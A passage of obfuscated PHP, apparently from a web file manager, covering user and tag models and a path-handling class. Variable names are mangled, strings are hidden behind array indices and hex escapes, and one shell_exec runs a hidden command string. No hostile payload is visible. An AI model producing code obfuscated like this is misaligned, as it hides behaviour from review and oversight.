unset($÷íå²ÚÉ[$­‡–Ïı”[369]][$©ÀÂ˜¡ˆ]); } } unset($”®øá…¤); $÷íå²ÚÉ[$­‡–Ïı”[369]] = array_values($÷íå²ÚÉ[$­‡–Ïı”[369]]); $÷íå²ÚÉ[$­‡–Ïı”[366]] = array($­‡–Ïı”[2104] => count($÷íå²ÚÉ[$­‡–Ïı”[369]]), $­‡–Ïı”[2102] => $÷íå²ÚÉ[$­‡–Ïı”[366]][$­‡–Ïı”[363]], $­‡–Ïı”[2101] => 1, $­‡–Ïı”[2103] => 1); } private function _searchFromMeta($—‚êà£‘, $¡ê¸¤‡³, $šâÀ¾) { $çø‰ó§ =& $_SERVER[Ì¥ŞÒ°£]; $¡ê¸¤‡³ = strtolower($¡ê¸¤‡³); $ Ãµøİğ = array($çø‰ó§[94] => $—‚êà£‘, $çø‰ó§[374] => array($çø‰ó§[383], "\45{$¡ê¸¤‡³}\x25")); $ Ãµøİğ = $this->parseWhereLike($ Ãµøİğ); $ô˜’ğ­Á = Model($çø‰ó§[2339])->where($ Ãµøİğ)->limit($šâÀ¾)->select(); if (!$ô˜’ğ­Á) { return array(); } $ô˜’ğ­Á = array_to_keyvalue($ô˜’ğ­Á, $çø‰ó§[12], $çø‰ó§[1667]); $±‘ÔÀ¾ = $this->where(array($çø‰ó§[1658] => array($çø‰ó§[7], $ô˜’ğ­Á)))->select(); if (!$±‘ÔÀ¾) { return array(); } return $±‘ÔÀ¾; } private function _listDataApplyItem($£Çøóƒƒ) { $®†„öå = array($£Çøóƒƒ); $this->_listDataApply($®†„öå); return $®†„öå[0]; } private function _listDataApply(&$‘Üß¿éÏ) { $¡¡ô¦éÉ =& $_SERVER[Ì¥ŞÒ°£]; if (!$‘Üß¿éÏ) { return; } array_remove_key($‘Üß¿éÏ, $¡¡ô¦éÉ[892]); $£Ä•×©Õ = array_to_keyvalue($‘Üß¿éÏ, $¡¡ô¦éÉ[12], $¡¡ô¦éÉ[1667]); $this->_listAppendGroup($‘Üß¿éÏ, $£Ä•×©Õ); $this->_listAppendMeta($‘Üß¿éÏ, $£Ä•×©Õ); $this->_listAppendSourceRoot($‘Üß¿éÏ, $£Ä•×©Õ); } private function _listAppendSourceRoot(&$ÇßÆÛÂ›, $¥®”³¶) { $şä À¸Œ =& $_SERVER[Ì¥ŞÒ°£]; $‹ÆÅ¢º = Model($şä À¸Œ[827])->listSourceRoot(SourceModel::TYPE_USER, $¥®”³¶); $‹ÆÅ¢º = array_to_keyvalue($‹ÆÅ¢º, $şä À¸Œ[505]); $‹ÆÅ¢º = array_remove_key($‹ÆÅ¢º, $şä À¸Œ[505]); foreach ($ÇßÆÛÂ› as &$ÍÛ¸Å®­) { $ÍÛ¸Å®­[$şä À¸Œ[86]] = $‹ÆÅ¢º[$ÍÛ¸Å®­[$şä À¸Œ[1667]]] ? $‹ÆÅ¢º[$ÍÛ¸Å®­[$şä À¸Œ[1667]]] : array(); } unset($ÍÛ¸Å®­); } private function _listAppendGroup(&$Æ©ìğÃÊ, $ííÊ¦ú¸) { $ğ©ö¤Ñ =& $_SERVER[Ì¥ŞÒ°£]; $§ªÓø‘ƒ = array($ğ©ö¤Ñ[1667] => array($ğ©ö¤Ñ[7], $ííÊ¦ú¸)); $Í½™Í† = Model($ğ©ö¤Ñ[1947])->where($§ªÓø‘ƒ)->select(); $ã¶ÓÕµ = array_to_keyvalue($Í½™Í†, $ğ©ö¤Ñ[12], $ğ©ö¤Ñ[1857]); $ã¶ÓÕµ = array_remove_value(array_unique($ã¶ÓÕµ), $ğ©ö¤Ñ[197]); if (!$ã¶ÓÕµ || !$Í½™Í†) { return; } $§ªÓø‘ƒ = array($ğ©ö¤Ñ[1857] => array($ğ©ö¤Ñ[7], $ã¶ÓÕµ)); $‘ŞÚğÀ¡ = Model($ğ©ö¤Ñ[2038])->field($ğ©ö¤Ñ[2340])->where($§ªÓø‘ƒ)->select(); $‘ŞÚğÀ¡ = array_to_keyvalue($‘ŞÚğÀ¡, $ğ©ö¤Ñ[1857]); $Í½™Í† = array_to_keyvalue_group($Í½™Í†, $ğ©ö¤Ñ[1667]); foreach ($Í½™Í† as &$ıô‘¸ı—) { $ã¨­ªéã = array(); foreach ($ıô‘¸ı— as $ä”Ş’Óş) { if (!$ä”Ş’Óş[$ğ©ö¤Ñ[1961]]) { continue; } $™¿œ÷‡á = Model($ğ©ö¤Ñ[507])->listData($ä”Ş’Óş[$ğ©ö¤Ñ[1961]]); $ã¨­ªéã[] = array($ğ©ö¤Ñ[1857] => $ä”Ş’Óş[$ğ©ö¤Ñ[1857]], $ğ©ö¤Ñ[2341] => $‘ŞÚğÀ¡[$ä”Ş’Óş[$ğ©ö¤Ñ[1857]]][$ğ©ö¤Ñ[32]], $ğ©ö¤Ñ[521] => $‘ŞÚğÀ¡[$ä”Ş’Óş[$ğ©ö¤Ñ[1857]]][$ğ©ö¤Ñ[521]], $ğ©ö¤Ñ[413] => $™¿œ÷‡á); } $ıô‘¸ı— = $ã¨­ªéã; } unset($ıô‘¸ı—); foreach ($Æ©ìğÃÊ as &$ææİ¥µ) { $ææİ¥µ[$ğ©ö¤Ñ[2040]] = array(); if (isset($Í½™Í†[$ææİ¥µ[$ğ©ö¤Ñ[1667]]])) { $ææİ¥µ[$ğ©ö¤Ñ[2040]] = $Í½™Í†[$ææİ¥µ[$ğ©ö¤Ñ[1667]]]; } } unset($ææİ¥µ); } public function userAppendGroup($–í÷˜) { $Â£°††» =& $_SERVER[Ì¥ŞÒ°£]; if (!$–í÷˜) { return array(); } $this->_listAppendGroup($–í÷˜, array_to_keyvalue($–í÷˜, $Â£°††»[12], $Â£°††»[1667])); return $–í÷˜; } private function _listAppendMeta(&$¬íœò, $¥Ñé¦íñ) { $¨¤ö¤Ş† =& $_SERVER[Ì¥ŞÒ°£]; $·«ö‹Š¨ = UserJobModel::JOB_KEY; $´»Î Ö = array($¨¤ö¤Ş†[2321]); $Üæà‘ß› = array($¨¤ö¤Ş†[1667] => array($¨¤ö¤Ş†[7], $¥Ñé¦íñ)); $µÖ¯­ = Model($¨¤ö¤Ş†[2319])->where($Üæà‘ß›)->select(); $µÖ¯­ = array_to_keyvalue_group($µÖ¯­, $¨¤ö¤Ş†[1667]); foreach ($µÖ¯­ as &$Ïô¸‚¥‡) { $¬¡”İ = array(); foreach ($Ïô¸‚¥‡ as $ÇÓ“›é) { if (!in_array($ÇÓ“›é[$¨¤ö¤Ş†[94]], $´»Î Ö)) { $¬¡”İ[$ÇÓ“›é[$¨¤ö¤Ş†[94]]] = $ÇÓ“›é[$¨¤ö¤Ş†[374]]; } } $Ïô¸‚¥‡ = $¬¡”İ; } unset($Ïô¸‚¥‡); $Œ¢øÈó  = Model($¨¤ö¤Ş†[2342]); foreach ($¬íœò as &$ğí¥Å¤›) { $Æ…¾Ì«º = array(); if (isset($µÖ¯­[$ğí¥Å¤›[$¨¤ö¤Ş†[1667]]])) { $Æ…¾Ì«º = $µÖ¯­[$ğí¥Å¤›[$¨¤ö¤Ş†[1667]]]; } $ğí¥Å¤›[$¨¤ö¤Ş†[2343]] = array(); if (isset($Æ…¾Ì«º[$·«ö‹Š¨])) { $ğí¥Å¤›[$¨¤ö¤Ş†[2343]] = $Œ¢øÈó ->getUserJobInfo($Æ…¾Ì«º[$·«ö‹Š¨]); } } unset($ğí¥Å¤›); } protected function groupUserAll($½ü¼¤æ) { $»·‘Ø™¹ =& $_SERVER[Ì¥ŞÒ°£]; if (!$½ü¼¤æ) { return !1; } $îµ¶÷ßò = Model($»·‘Ø™¹[1947])->field($»·‘Ø™¹[1667])->where(array($»·‘Ø™¹[1857] => array($»·‘Ø™¹[7], $½ü¼¤æ)))->select(); $îµ¶÷ßò = array_to_keyvalue($îµ¶÷ßò, $»·‘Ø™¹[12], $»·‘Ø™¹[1667]); return array_unique($îµ¶÷ßò); } public function userSearch($á¢ü÷¨…, $Ú‘úç½ = "\52") { return Model($_SERVER[Ì¥ŞÒ°£][535])->where($á¢ü÷¨…)->field($Ú‘úç½)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\x65\162\x5f\157\x70\x74\x69\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Í¯Ï½›) { $òÃÁï =& $_SERVER[Ì¥ŞÒ°£]; if (!defined($òÃÁï[475])) { define($òÃÁï[475], 0); } return "\125\x73\x65\162\x4f\160\164\x69\x6f\156\137{$Í¯Ï½›}\137" . USER_ID; } protected function filterWhere($ºâÆ¾ø) { $°›¥­²Æ =& $_SERVER[Ì¥ŞÒ°£]; if (!defined($°›¥­²Æ[475])) { define($°›¥­²Æ[475], 0); } $ºâÆ¾ø[$°›¥­²Æ[1667]] = USER_ID; return $ºâÆ¾ø; } public function cacheRemoveUser($‚¥ã‰ú, $öÎáÔ¯˜) { return Cache::remove("\x55\163\145\162\117\x70\x74\x69\157\x6e\137{$‚¥ã‰ú}\x5f" . $öÎáÔ¯˜); } protected function optionDefault($»®ƒûãô = '') { $î©¡ë¦ı =& $_SERVER[Ì¥ŞÒ°£]; if ($»®ƒûãô == $î©¡ë¦ı[12]) { return $GLOBALS[$î©¡ë¦ı[6]][$î©¡ë¦ı[2344]]; } if ($»®ƒûãô == $î©¡ë¦ı[2345]) { return $GLOBALS[$î©¡ë¦ı[6]][$î©¡ë¦ı[2346]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\x72\x2e\x74\141\x67\x4c\x69\163\164"; public $modelType = "\125\x73\145\x72\117\x70\164\x69\157\156"; public $field = array("\x6e\141\x6d\x65", "\163\x74\x79\x6c\x65", "\x73\157\x72\x74"); public function listData($àº©‘–ğ = false, $­À‰‰ÃĞ = "\x73\x6f\x72\x74", $˜•Úş¸Ë = false) { return parent::listData($àº©‘–ğ, $­À‰‰ÃĞ, $˜•Úş¸Ë); } public function remove($Óá£»òä) { return parent::remove($Óá£»òä); } public function add($’ñş¹Ñ, $÷šáû±õ = "\x6c\141\142\x65\x6c\55\147\x72\x65\x79\55\x6e\157\x72\x6d\x61\x6c") { $ÉÀí–ú› =& $_SERVER[Ì¥ŞÒ°£]; if ($this->findByName($’ñş¹Ñ)) { return !1; } $ÆĞˆÈËó = array($ÉÀí–ú›[420] => $’ñş¹Ñ, $ÉÀí–ú›[485] => $÷šáû±õ, $ÉÀí–ú›[1861] => $this->getSort($ÉÀí–ú›[258]) + 1); return parent::insert($ÆĞˆÈËó); } public function update($ˆâ·€º, $‘ÂÉ©²) { $´Ç½ÌŞÕ =& $_SERVER[Ì¥ŞÒ°£]; $²ûê‚Äö = $this->listData($ˆâ·€º); $İˆÜÎ¼Û = $this->findByName($‘ÂÉ©²[$´Ç½ÌŞÕ[32]]); if (!$²ûê‚Äö || $İˆÜÎ¼Û && $İˆÜÎ¼Û[$´Ç½ÌŞÕ[399]] != $²ûê‚Äö[$´Ç½ÌŞÕ[399]]) { return !1; } return parent::update($ˆâ·€º, $‘ÂÉ©²); } public function moveTop($Ú£Å¼¾ı) { $öàÛáÆ =& $_SERVER[Ì¥ŞÒ°£]; $šÒ®Ÿ¡º = parent::listData(); $¾ĞÊä¥Û = $this->getSort($öàÛáÆ[257]); foreach ($šÒ®Ÿ¡º as &$¡éÈ¹è’) { if ($¡éÈ¹è’[$öàÛáÆ[399]] == $Ú£Å¼¾ı) { $¡éÈ¹è’[$öàÛáÆ[1881]] = $¾ĞÊä¥Û; continue; } $¡éÈ¹è’[$öàÛáÆ[1881]] += 1; } unset($¡éÈ¹è’); return parent::resetData($šÒ®Ÿ¡º); } public function moveBottom($ÛîÛ’Şà) { $ª¥€¶è =& $_SERVER[Ì¥ŞÒ°£]; $˜ùµÉ³¥ = $this->getSort($ª¥€¶è[258]) + 1; return parent::update($ÛîÛ’Şà, array($ª¥€¶è[1881] => $˜ùµÉ³¥)); } public function resetSort($„ç’®—) { $ıĞóõà =& $_SERVER[Ì¥ŞÒ°£]; $…€ÉŒ˜ = array(); $„ç’®— = is_array($„ç’®—) ? $„ç’®— : array(); for ($µ¢é•“ä = 0; $µ¢é•“ä < count($„ç’®—); $µ¢é•“ä++) { $…€ÉŒ˜[$„ç’®—[$µ¢é•“ä] . $ıĞóõà[12]] = $µ¢é•“ä + 1; } $ˆ€‹«é¡ = parent::listData(); foreach ($ˆ€‹«é¡ as &$Ìº‹âÎ) { $ªù€äöÒ = $…€ÉŒ˜[$Ìº‹âÎ[$ıĞóõà[399]]]; $Ìº‹âÎ[$ıĞóõà[1881]] = $ªù€äöÒ ? $ªù€äöÒ : $Ìº‹âÎ[$ıĞóõà[1881]]; } unset($Ìº‹âÎ); return parent::resetData($ˆ€‹«é¡); } private function getSort($ÌÎ§”õã) { $…¾İÕ¯¼ =& $_SERVER[Ì¥ŞÒ°£]; $„ÉÑ‡² = parent::listData(); $Ø¯ÔœŠâ = array_to_keyvalue($„ÉÑ‡², $…¾İÕ¯¼[12], $…¾İÕ¯¼[1881]); if (!$Ø¯ÔœŠâ) { $Ø¯ÔœŠâ = array(0); } $ÇÄ×ú‰Ë = $ÌÎ§”õã == $…¾İÕ¯¼[258] ? max($Ø¯ÔœŠâ) : min($Ø¯ÔœŠâ); return intval($ÇÄ×ú‰Ë); } } goto C²öêóšÀÔ; d¥È­«ÓîÑ: class KodIO { const KOD_SOURCE = "\173\x73\x6f\165\162\143\145\175"; const KOD_USER_RECYCLE = "\173\165\163\145\162\x52\145\x63\x79\143\154\x65\175"; const KOD_USER_FAV = "\173\165\163\145\x72\x46\x61\166\175"; const KOD_USER_FILE_TAG = "\173\165\163\x65\162\106\x69\x6c\145\x54\x61\147\175"; const KOD_USER_FILE_TYPE = "\173\165\163\x65\162\x46\151\x6c\145\x54\x79\160\145\175"; const KOD_GROUP_ROOT_SELF = "\173\147\162\x6f\x75\x70\122\x6f\x6f\x74\x53\x65\154\x66\175"; const KOD_USER_SHARE = "\173\x75\163\x65\x72\x53\150\x61\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\x65\162\123\x68\x61\x72\145\x4c\151\x6e\x6b\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\x61\162\x65\124\x6f\x4d\145\x7d"; const KOD_SHARE_ITEM = "\173\163\x68\x61\x72\x65\111\164\x65\155\x7d"; const KOD_SHARE_LINK = "\x7b\163\x68\141\162\x65\111\164\145\x6d\114\151\x6e\153\175"; const KOD_SEARCH = "\x7b\163\145\x61\x72\143\150\x7d"; const KOD_BLOCK = "\173\x62\154\x6f\x63\x6b\x7d"; const KOD_IO = "\x7b\x69\x6f\175"; const KOD_USER_RECENT = "\173\165\x73\145\162\x52\x65\x6e\143\145\x6e\164\x7d"; const KOD_USER_DRIVER = "\x7b\x64\x72\151\166\x65\162\175"; public static function typeList() { $–€Ò÷„ =& $_SERVER[Ì¥ŞÒ°£]; return array($–€Ò÷„[1257] => self::KOD_SOURCE, $–€Ò÷„[1258] => self::KOD_USER_RECYCLE, $–€Ò÷„[1259] => self::KOD_USER_FAV, $–€Ò÷„[1260] => self::KOD_USER_FILE_TAG, $–€Ò÷„[1261] => self::KOD_USER_FILE_TYPE, $–€Ò÷„[1262] => self::KOD_GROUP_ROOT_SELF, $–€Ò÷„[1263] => self::KOD_USER_SHARE, $–€Ò÷„[1264] => self::KOD_USER_SHARE_LINK, $–€Ò÷„[1265] => self::KOD_USER_SHARE_TO_ME, $–€Ò÷„[1266] => self::KOD_SHARE_ITEM, $–€Ò÷„[1267] => self::KOD_SHARE_LINK, $–€Ò÷„[1268] => self::KOD_SEARCH, $–€Ò÷„[1269] => self::KOD_BLOCK, $–€Ò÷„[1270] => self::KOD_IO, $–€Ò÷„[1271] => self::KOD_USER_RECENT, $–€Ò÷„[1272] => self::KOD_USER_DRIVER); } public static function parse($¾åÓ€²Í) { $Ó¯ÔøÄ =& $_SERVER[Ì¥ŞÒ°£]; $¾åÓ€²Í = self::clear($¾åÓ€²Í); $İ„·³¯õ = array_values(self::typeList()); preg_match($Ó¯ÔøÄ[1273], $¾åÓ€²Í, $ˆ—´»‹—); $ùçÌñ¬– = array($Ó¯ÔøÄ[422] => !1, $Ó¯ÔøÄ[1274] => !1, $Ó¯ÔøÄ[419] => !1, $Ó¯ÔøÄ[84] => $¾åÓ€²Í, $Ó¯ÔøÄ[1175] => !1, $Ó¯ÔøÄ[1174] => $Ó¯ÔøÄ[12]); if (is_array($ˆ—´»‹—) && count($ˆ—´»‹—) == 5) { $èƒŠçÏ = $Ó¯ÔøÄ[1275] . $ˆ—´»‹—[2] . $Ó¯ÔøÄ[327]; if (in_array($èƒŠçÏ, $İ„·³¯õ)) { $ùçÌñ¬–[$Ó¯ÔøÄ[1175]] = $ˆ—´»‹—[1]; $ùçÌñ¬–[$Ó¯ÔøÄ[33]] = $èƒŠçÏ; $ùçÌñ¬–[$Ó¯ÔøÄ[1276]] = substr($èƒŠçÏ, 1, -1); $ùçÌñ¬–[$Ó¯ÔøÄ[399]] = $ˆ—´»‹—[3]; } $ùçÌñ¬–[$Ó¯ÔøÄ[1174]] = $ˆ—´»‹—[4]; } $ÏÃãÏ§Å = array($Ó¯ÔøÄ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ùçÌñ¬–[$Ó¯ÔøÄ[1239]] = in_array($ùçÌñ¬–[$Ó¯ÔøÄ[33]], $ÏÃãÏ§Å); return $ùçÌñ¬–; } public static function isTruePath($•ö¿µ‡) { $¨”ÃƒÅ” =& $_SERVER[Ì¥ŞÒ°£]; if (substr($•ö¿µ‡, 0, 1) != $¨”ÃƒÅ”[1275]) { return !0; } if (strpos($•ö¿µ‡, $¨”ÃƒÅ”[408]) === 0) { return !0; } if (strpos($•ö¿µ‡, $¨”ÃƒÅ”[1243]) === 0) { return !0; } if (strpos($•ö¿µ‡, $¨”ÃƒÅ”[1277]) === 0) { return !0; } if (strpos($•ö¿µ‡, $¨”ÃƒÅ”[1278]) === 0) { return !0; } if (strpos($•ö¿µ‡, $¨”ÃƒÅ”[1279]) === 0) { return !0; } return !1; } public static function clear($ÃÛê¥œô) { $¯ğ÷‰û¿ =& $_SERVER[Ì¥ŞÒ°£]; $ÃÛê¥œô = str_replace(array($¯ğ÷‰û¿[1083], $¯ğ÷‰û¿[231]), $¯ğ÷‰û¿[53], $ÃÛê¥œô); $ÃÛê¥œô = str_replace($¯ğ÷‰û¿[97], $¯ğ÷‰û¿[8], $ÃÛê¥œô); $È´ğˆêğ = $¯ğ÷‰û¿[1280]; if (substr($ÃÛê¥œô, 0, 3) == $¯ğ÷‰û¿[1281]) { $ÃÛê¥œô = substr($ÃÛê¥œô, 3); } while (strstr($ÃÛê¥œô, $È´ğˆêğ)) { $ÃÛê¥œô = str_replace($È´ğˆêğ, $¯ğ÷‰û¿[8], $ÃÛê¥œô); } $ÃÛê¥œô = preg_replace($¯ğ÷‰û¿[1282], $¯ğ÷‰û¿[8], $ÃÛê¥œô); if ($ÃÛê¥œô == $¯ğ÷‰û¿[8]) { return $¯ğ÷‰û¿[8]; } $ÃÛê¥œô = rtrim($ÃÛê¥œô, $¯ğ÷‰û¿[8]); return $ÃÛê¥œô; } public static function sourceID($Õ‡Ã”šƒ) { $Šå˜¯Ê­ =& $_SERVER[Ì¥ŞÒ°£]; $ó®­°êñ = self::parse($Õ‡Ã”šƒ); if ($ó®­°êñ[$Šå˜¯Ê­[33]] !== self::KOD_SOURCE) { show_json(LNG($Šå˜¯Ê­[1283]), !1); } return $ó®­°êñ[$Šå˜¯Ê­[399]]; } public static function make($ÃÚ®‹´Ú) { if (!$ÃÚ®‹´Ú) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ÃÚ®‹´Ú)); } public static function makeShare($°¥†ù£, $ş€”˜¦¾) { return self::makePath(self::KOD_SHARE_ITEM, $°¥†ù£, $ş€”˜¦¾); } public static function makeFileTypePath($˜ãè³àè) { return self::makePath(self::KOD_USER_FILE_TYPE, $˜ãè³àè); } public static function makeFileTagPath($‡®£û¸å) { return self::makePath(self::KOD_USER_FILE_TAG, $‡®£û¸å); } public static function makePath($›…éÅ°¥, $îìôé = '', $¼ë ®¨ï = '') { $¹Ÿ¤ˆÔ =& $_SERVER[Ì¥ŞÒ°£]; $¡À•ôê¬ = substr($›…éÅ°¥, 1, -1); $¢áÂ­àó = $¹Ÿ¤ˆÔ[1284] . $¡À•ôê¬ . $¹Ÿ¤ˆÔ[1285] . $îìôé . $¹Ÿ¤ˆÔ[1286]; $¢áÂ­àó = $¼ë ®¨ï ? $¢áÂ­àó . $¼ë ®¨ï . $¹Ÿ¤ˆÔ[8] : $¢áÂ­àó; return $¢áÂ­àó; } public static function hashPath($ ¥÷ê¶, $ØğÔ¬Ğ = true) { $¾Ò†²Ñ” =& $_SERVER[Ì¥ŞÒ°£]; $ª¸øáÄÕ = is_array($ ¥÷ê¶) ? $ ¥÷ê¶ : IO::info($ ¥÷ê¶); $òû‡Á¡ = _get($ª¸øáÄÕ, $¾Ò†²Ñ”[1287], $¾Ò†²Ñ”[12]); if (!$òû‡Á¡ && isset($ª¸øáÄÕ[$¾Ò†²Ñ”[402]])) { $ª¸øáÄÕ = IO::info(KodIO::make($ª¸øáÄÕ[$¾Ò†²Ñ”[402]])); $òû‡Á¡ = _get($ª¸øáÄÕ, $¾Ò†²Ñ”[1287], $¾Ò†²Ñ”[12]); } if (!$òû‡Á¡ && $ØğÔ¬Ğ) { $¶ÑæÁÃÓ = KodIO::parse($ª¸øáÄÕ[$¾Ò†²Ñ”[84]]); if (!$¶ÑæÁÃÓ[$¾Ò†²Ñ”[33]]) { $òû‡Á¡ = IO::hashSimple($ª¸øáÄÕ[$¾Ò†²Ñ”[84]]); } } if (!$òû‡Á¡) { $òû‡Á¡ = md5($ª¸øáÄÕ[$¾Ò†²Ñ”[84]] . $ª¸øáÄÕ[$¾Ò†²Ñ”[76]] . $ª¸øáÄÕ[$¾Ò†²Ñ”[85]]); } return $òû‡Á¡; } public static function hashPathSafe($õ€÷Ãå, $ìì½Ö­Ò = true) { $óĞ÷ş­¼ =& $_SERVER[Ì¥ŞÒ°£]; $ÏÆêÆÄ÷ = self::hashPath($õ€÷Ãå, $ìì½Ö­Ò); return md5($ÏÆêÆÄ÷ . $óĞ÷ş­¼[1288] . Model($óĞ÷ş­¼[772])->get($óĞ÷ş­¼[773])); } public static function initSystemPath() { $¨œ–º´ =& $_SERVER[Ì¥ŞÒ°£]; if (defined($¨œ–º´[1289])) { return; } define($¨œ–º´[1289], self::systemPath($¨œ–º´[1290])); define($¨œ–º´[1291], self::systemPath($¨œ–º´[1292])); define($¨œ–º´[1293], self::systemPath($¨œ–º´[1294])); define($¨œ–º´[1295], self::systemPath($¨œ–º´[1296])); IOHistory::bindEvent(); } public static function systemPath($‹¶¤¬·) { $ÓÆ˜ÄßÍ =& $_SERVER[Ì¥ŞÒ°£]; $¦ÁĞ±Æ¸ = $ÓÆ˜ÄßÍ[1297] . ucfirst($‹¶¤¬·); $…×¾±ûµ = Model($ÓÆ˜ÄßÍ[772])->get($¦ÁĞ±Æ¸); if ($…×¾±ûµ) { return $…×¾±ûµ; } if ($‹¶¤¬· == $ÓÆ˜ÄßÍ[1290]) { $…×¾±ûµ = self::make(Model($ÓÆ˜ÄßÍ[827])->systemRootPathAdd($ÓÆ˜ÄßÍ[544])); } else { $…×¾±ûµ = self::systemPath($ÓÆ˜ÄßÍ[1290]); $‡´áğ½î = self::sourceID($…×¾±ûµ); $…×¾±ûµ = self::make(Model($ÓÆ˜ÄßÍ[827])->mkdir($‡´áğ½î, $‹¶¤¬·)); } Model($ÓÆ˜ÄßÍ[772])->set($¦ÁĞ±Æ¸, $…×¾±ûµ); return $…×¾±ûµ; } public static function systemFolder($¿É‹¯Á) { $ˆøü´Ëü = IO_PATH_SYSTEM_SOURCE . $¿É‹¯Á; $×Ä§Äá = Cache::get($ˆøü´Ëü); if (!$×Ä§Äá) { $È´µ¡Óê = IO::infoFull($ˆøü´Ëü); if (!$È´µ¡Óê) { $×Ä§Äá = IO::mkdir($ˆøü´Ëü, REPEAT_SKIP); } else { $×Ä§Äá = $È´µ¡Óê[$_SERVER[Ì¥ŞÒ°£][84]]; } Cache::set($ˆøü´Ëü, $×Ä§Äá, 3600 * 10); } return $×Ä§Äá; } public static function defaultDriver() { return Model($_SERVER[Ì¥ŞÒ°£][769])->defaultDriver(); } public static function defaultIO() { $ÒÂÊü¨„ =& $_SERVER[Ì¥ŞÒ°£]; $Ë¹å±²Õ = self::defaultDriver(); return $ÒÂÊü¨„[1298] . $Ë¹å±²Õ[$ÒÂÊü¨„[399]] . $ÒÂÊü¨„[1286]; } public static function defaultDriverInit() { static $¸Î¶öı = false; if ($¸Î¶öı) { return $¸Î¶öı; } $¸Î¶öı = IO::init(self::defaultIO()); return $¸Î¶öı; } public static function fileTypeList() { $ÛŠî¬á‚ =& $_SERVER[Ì¥ŞÒ°£]; $Ú’²½§… = $GLOBALS[$ÛŠî¬á‚[6]][$ÛŠî¬á‚[1299]]; foreach ($Ú’²½§… as $èßéáøİ => $ŸûØœÃÂ) { $Å¤’©Ñ• = $ÛŠî¬á‚[1300] . $èßéáøİ; $„ô»¥œ² = LNG($Å¤’©Ñ•); if ($Å¤’©Ñ• != $„ô»¥œ²) { $Ú’²½§…[$èßéáøİ][$ÛŠî¬á‚[32]] = $„ô»¥œ²; } } return $Ú’²½§…; } public static function diskList($óª Ÿ¦œ = true) { $©‡„úÈÙ = $_SERVER[Ì¥ŞÒ°£][1301]; if ($óª Ÿ¦œ) { $œäÕéñº = Cache::get($©‡„úÈÙ); if (is_array($œäÕéñº)) { return $œäÕéñº; } } $œäÕéñº = self::diskListGet(); Cache::set($©‡„úÈÙ, $œäÕéñº, 60); return $œäÕéñº; } public static function diskListGet() { $‡š¸ÚÓÕ =& $_SERVER[Ì¥ŞÒ°£]; $©»õ‹šÔ = array(); if ($GLOBALS[$‡š¸ÚÓÕ[6]][$‡š¸ÚÓÕ[1302]] == $‡š¸ÚÓÕ[1303]) { $àÔá‹ú¾ = $‡š¸ÚÓÕ[1304]; for ($¦‘çô•† = 0; $¦‘çô•† < strlen($àÔá‹ú¾); $¦‘çô•†++) { $¥¢âü = $àÔá‹ú¾[$¦‘çô•†] . $‡š¸ÚÓÕ[1305]; if (file_exists($¥¢âü)) { $©»õ‹šÔ[] = $¥¢âü; } } return $©»õ‹šÔ; } if (!function_exists($‡š¸ÚÓÕ[98])) { $©»õ‹šÔ[] = $‡š¸ÚÓÕ[837]; return $©»õ‹šÔ; } $Ö×›¼‡ = explode($‡š¸ÚÓÕ[231], shell_exec($‡š¸ÚÓÕ[1306])); array_shift($Ö×›¼‡); array_pop($Ö×›¼‡); $Û­×§â = array($‡š¸ÚÓÕ[1307], $‡š¸ÚÓÕ[1308], $‡š¸ÚÓÕ[1309], $‡š¸ÚÓÕ[1310], $‡š¸ÚÓÕ[1311], $‡š¸ÚÓÕ[1312], $‡š¸ÚÓÕ[1313], $‡š¸ÚÓÕ[1314]); foreach ($Ö×›¼‡ as $˜ùØ’«Ë) { $°«İêüÙ = preg_split($‡š¸ÚÓÕ[1315], $˜ùØ’«Ë); $¥¢âü = $°«İêüÙ[count($°«İêüÙ) - 1]; if (!strstr($°«İêüÙ[0], $‡š¸ÚÓÕ[1316]) || !$¥¢âü) { continue; } $âîÈ’‹ù = rtrim($¥¢âü, $‡š¸ÚÓÕ[8]) . $‡š¸ÚÓÕ[8]; if (in_array($âîÈ’‹ù, $Û­×§â)) { continue; } $©»õ‹šÔ[] = $âîÈ’‹ù; } return $©»õ‹šÔ; } public static function isSameDisk($ÏŸ²ô¸¾, $ö­ó¾¿ü) { $€½µŞÆ =& $_SERVER[Ì¥ŞÒ°£]; if ($GLOBALS[$€½µŞÆ[6]][$€½µŞÆ[1302]] == $€½µŞÆ[1303]) { return strtolower(substr($ÏŸ²ô¸¾, 0, 1)) == strtolower(substr($ö­ó¾¿ü, 0, 1)); } $¹Š¥úÜø = self::diskList(); $ƒğáºû› = !1; $ÉüºãŸ® = !1; sort($¹Š¥úÜø); $¹Š¥úÜø = array_reverse($¹Š¥úÜø); $ÏŸ²ô¸¾ = rtrim($ÏŸ²ô¸¾, $€½µŞÆ[8]) . $€½µŞÆ[8]; $ö­ó¾¿ü = rtrim($ö­ó¾¿ü, $€½µŞÆ[8]) . $€½µŞÆ[8]; foreach ($¹Š¥úÜø as $‡›¬Í¿) { $£Âİé”‘ = strlen($‡›¬Í¿); if (!$ƒğáºû› && substr($ÏŸ²ô¸¾, 0, $£Âİé”‘) == $‡›¬Í¿) { $ƒğáºû› = $‡›¬Í¿; } if (!$ÉüºãŸ® && substr($ö­ó¾¿ü, 0, $£Âİé”‘) == $‡›¬Í¿) { $ÉüºãŸ® = $‡›¬Í¿; } if ($ƒğáºû› && $ÉüºãŸ®) { break; } } return $ƒğáºû› === $ÉüºãŸ®; } public static function transferType($Îæá¼ş, $ô¶ÒÈÌ†) { $ÏÊ×‰µ’ =& $_SERVER[Ì¥ŞÒ°£]; $ÂÖ»¼¸‰ = self::driverType($Îæá¼ş); $ó­èå€é = self::driverType($ô¶ÒÈÌ†); if ($ÂÖ»¼¸‰[$ÏÊ×‰µ’[33]] == $ó­èå€é[$ÏÊ×‰µ’[33]] && $ÂÖ»¼¸‰[$ÏÊ×‰µ’[1317]] == $ó­èå€é[$ÏÊ×‰µ’[1317]]) { return $ÏÊ×‰µ’[1318]; } if ($ÂÖ»¼¸‰[$ÏÊ×‰µ’[33]] == $ÏÊ×‰µ’[866] && $ó­èå€é[$ÏÊ×‰µ’[33]] == $ÏÊ×‰µ’[106]) { return 